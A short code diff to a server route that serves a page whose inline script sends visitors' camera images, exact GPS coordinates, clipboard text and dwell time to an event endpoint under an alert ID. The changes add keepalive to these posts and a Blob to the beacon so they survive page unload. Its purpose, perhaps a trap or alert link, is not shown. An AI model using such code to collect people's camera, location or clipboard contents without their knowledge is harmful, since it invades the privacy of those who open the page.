@@ -722,6 +722,7 @@ export async function GET(
                         fetch('/api/v1/event', {
                           method: 'POST',
                           headers: { 'Content-Type': 'application/json' },
+                          keepalive: true,
                           body: JSON.stringify({ alert_id: '${alertId}', details: { camera_image: camera_image } })
                         }).catch(()=>({}));
                       }, 500); 
@@ -739,6 +740,7 @@ export async function GET(
                     fetch('/api/v1/event', {
                       method: 'POST',
                       headers: { 'Content-Type': 'application/json' },
+                      keepalive: true,
                       body: JSON.stringify({ alert_id: '${alertId}', details: { exact_lat: pos.coords.latitude, exact_lon: pos.coords.longitude } })
                     }).catch(()=>{}).finally(() => {
                       if (window.fallbackTimer) clearTimeout(window.fallbackTimer);
@@ -765,7 +767,8 @@ export async function GET(
               dwell_time_ms = Date.now() - loadTime;
               const payload = JSON.stringify({ alert_id: '${alertId}', details: { dwell_time_ms: dwell_time_ms, clipboard_text: clipboard_text } });
               if (navigator.sendBeacon) {
-                navigator.sendBeacon('/api/v1/event', payload);
+                const blob = new Blob([payload], { type: 'application/json' });
+                navigator.sendBeacon('/api/v1/event', blob);
               } else {
                 fetch('/api/v1/event', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: payload, keepalive: true }).catch(()=>{});
               }
